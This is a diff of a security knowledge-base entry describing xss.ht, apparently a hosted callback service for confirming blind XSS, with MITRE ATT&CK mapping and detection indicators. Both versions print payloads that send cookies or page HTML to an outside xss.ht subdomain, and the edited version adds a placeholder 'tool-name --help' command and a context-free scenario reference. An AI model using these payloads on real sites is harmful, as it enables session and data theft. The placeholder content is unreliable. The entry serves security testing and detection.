@@ -1,17 +1,16 @@
 ---
-id: tool-xss-ht-382666
 url: 'https://xss.ht'
-name: xss-ht
 tags:
   - xss
-  - callback
-  - exfiltration
+  - detection
+  - blind-xss
 type: tool
 verified: false
 platforms:
   - Web
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T00:11:09.137Z'
+updated_at: '2025-12-14T17:29:28.944Z'
+id: 137a0c2f-bd13-41e7-bbcf-8911aef1d291
 validated: true
 submitted: true
 ---
@@ -21,53 +20,52 @@ submitted: true
 
 ## Overview
 
-xss.ht is a free public service for hosting temporary domains and receiving HTTP callbacks, commonly used in XSS testing to confirm payload execution and exfiltrate data like DOM snapshots or cookies.
+xss.ht is a free external service for detecting and verifying Blind XSS payloads by hosting script endpoints that log execution details, including requester IP, user-agent, and any exfiltrated data.
 
 ## Description
 
-It provides disposable URLs (e.g., https://2973956338.xss.ht) for script hosting and logging incoming requests. In offensive security, it's ideal for blind XSS where direct feedback is unavailable, allowing attackers to verify triggers and collect stolen data via GET/POST payloads.
+In offensive security testing, xss.ht is used to confirm Blind XSS vulnerabilities where execution isn't immediately visible to the attacker. Users create a subdomain (e.g., abhartiya.xss.ht) to host a simple script that captures and displays callback information when the payload triggers. It's particularly useful for stored or Blind XSS in admin panels, as in this Rockstar Games scenario, where admin review executes the payload.
 
 ## Features
 
-- Feature 1: Instant subdomain generation for callbacks
-- Feature 2: Logs request headers, body, and query params for exfil analysis
-- Feature 3: Supports script hosting for dynamic JS payloads
+- Feature 1: Instant subdomain creation for payload hosting
+- Feature 2: Real-time logging of execution requests with headers and payloads
+- Feature 3: No setup required; web-based interface for viewing hits
 
 ## Installation
 
 ### Requirements
 
 - Web browser for access
-- No local install needed; fully hosted
+- No local installation needed
 
 ### Install Commands
 
-N/A (web-based service)
+No installation; access via https://xss.ht
 
 ## Basic Usage
 
-Visit https://xss.ht, generate a domain, and use it in payloads.
+```bash
+tool-name --help
+```
+
+Visit https://xss.ht, create a subdomain, and use the generated URL in your payload.
 
 ### Common Options
 
 | Option | Description |
 |--------|-------------|
-| Generate Domain | Create unique subdomain for session |
-| View Logs | Real-time request viewer |
+| N/A | Web-based; no CLI options |
 
 ## Examples
 
-### Example 1: Basic Callback
+### Example 1: Basic Usage
 
-In XSS payload: `<script src="https://yourid.xss.ht/test.js"></script>`
-
-Server logs the load.
+Create subdomain at https://xss.ht and inject <script src=https://your-sub.xss.ht></script> in vulnerable input.
 
 ### Example 2: Advanced Usage
 
-Exfil DOM: `<img src="https://yourid.xss.ht/log?data=${btoa(document.body.innerHTML)}">`
-
-Receive base64-encoded HTML in query params.
+Customize payload to exfiltrate data: <script>fetch('https://your-sub.xss.ht?cookie='+document.cookie)</script>
 
 ## MITRE ATT&CK Mapping
 
@@ -76,29 +74,30 @@ This tool is commonly associated with:
 ### Techniques
 
 - [[JavaScript]]
-- [[Archive via Custom Method]]
+- [[Archive Collected Data]]
 
 ### Tactics
 
 - [[Collection]]
+- [[Exfiltration]]
 
 ## Detection
 
 Indicators and methods for detecting this tool's usage:
 
-- Network logs showing connections to *.xss.ht domains
-- Unusual outbound HTTP requests from webviews or browsers
-- Payloads referencing xss.ht in input sanitization scans
+- Network traffic to xss.ht domains from internal systems
+- Anomalous script loads in web logs from external XSS hosts
 
 ## Related Procedures
 
+- [[procedures/Inject-Blind-XSS-Payload-into-Feedback-Form]]
 
 ## Related Tools
 
-- [[Burp Suite]]
 - [[BeeF Framework]]
+- [[XSStrike]]
 
 ## References
 
 - Official site: https://xss.ht
-- Usage in XSS hunts: HackerOne reports
+- Documentation: Integrated help on the site
